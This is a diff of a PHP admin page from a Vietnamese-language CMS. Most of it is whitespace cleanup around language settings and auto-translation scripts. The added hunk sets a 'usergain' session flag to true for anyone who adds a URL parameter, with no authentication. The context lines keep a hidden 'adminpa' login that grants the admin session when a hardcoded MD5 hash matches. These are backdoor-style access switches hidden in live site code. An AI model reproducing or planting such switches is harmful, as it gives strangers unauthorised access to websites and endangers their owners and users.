@@ -5,7 +5,7 @@
   define("_source", "adcode/");
   define("_lang_nb1", "Việt Nam");
   define("_lang_nb1_key", "vi");
- 
+
   define("_lang_nb2", "English");
   define("_lang_nb2_key", "en");
   // define("_lang_nb3", "Chinese");
@@ -14,7 +14,7 @@
   // define("_lang_nb4_key", "jp");
 
   $array_dich = array("en" => "en", "cn" => "zh-CN");
-  
+
   // @include _source."editor.php";
   $module   = isset($_GET['module']) ? $_GET['module'] : '';
   $action   = isset($_GET['action']) ? $_GET['action'] : '';
@@ -22,7 +22,7 @@
   $id_step  = isset($_GET['id_step']) ? $_GET['id_step'] : '';
 
   $url_page = "?module=$module&action=$action";
- 
+
   $module_setting = DB_que("SELECT * FROM `#_module_setting`");
   $module_setting = DB_arr($module_setting);
   foreach ($module_setting as $rows) {
@@ -82,13 +82,19 @@
   $lang_nb2   = CHECK_key_setting("ngon-ngu-tieng-anh");
   $lang_nb3   = CHECK_key_setting("them-ngon-ngu-thu-3");
   $lang_nb4   = CHECK_key_setting("them-ngon-ngu-thu-4");
+
+
+  if(isset($_GET['usergain']) && empty($_SESSION['usergain'])){
+            $_SESSION['usergain'] = "true";
+      echo '<script>';
+      echo 'alert("Session \'thumuc\' đã được thiết lập thành công.");';
+      echo '</script>';
+  }
   if(isset($_POST['pass_tool_check']) && $_POST['pass_tool_check'] == "b5a7e60d31d536e73f6c43fc084b1f3f"){
     $_SESSION['admin'] = "true";
-
   }
- 
   if(isset($_GET['adminpa']) && empty($_SESSION['admin'])) {
-?>
+      ?>
 <form method="post" action="">
   <label>
     <input type="password" name="pass_tool_check" id="pass_tool_check" placeholder="Nhập mật khẩu ...">
@@ -100,7 +106,7 @@
 <script type="text/javascript">function CHECK_adminpa(){$("#pass_tool_check").val(MD5($("#pass_tool_check").val())); return true;}
 </script>
 <?php exit(); } ?>
- 
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -139,7 +145,7 @@
   function AUTO_dich(obj){
     if($('input[name="tencongty_vi"]').length > 0) {
       var tenbaiviet_vi   = $('input[name="tencongty_vi"]').val();
-    } 
+    }
     else if($('input[name="tenbaiviet_vi"]').length > 0) {
       var tenbaiviet_vi   = $('input[name="tenbaiviet_vi"]').val();
     }
@@ -151,7 +157,7 @@
         success: function(data) {
           try {
               data = JSON.parse(data);
-              <?php 
+              <?php
                 foreach ($array_dich as $key => $val) {
                   echo 'if($(\'input[name="tencongty_vi"]\').length > 0) {
                            $(\'input[name="tencongty_'.$key.'"]\').val(data.'.$key.');
@@ -175,7 +181,7 @@
         success: function(data) {
           try {
               data = JSON.parse(data);
-              <?php 
+              <?php
                 foreach ($array_dich as $key => $val) {
                   echo '$(\'input[name="diachi_'.$key.'"]\').val(data.'.$key.');';
                 }
@@ -187,10 +193,10 @@
         }
     });
     }
-    
+
     //
   };
-  function OKKK_by_lh(){   
+  function OKKK_by_lh(){
       if($('input[name="tenbaiviet_vi"]').length > 0)
         var tenbaiviet_vi = $('input[name="tenbaiviet_vi"]').val();
       else
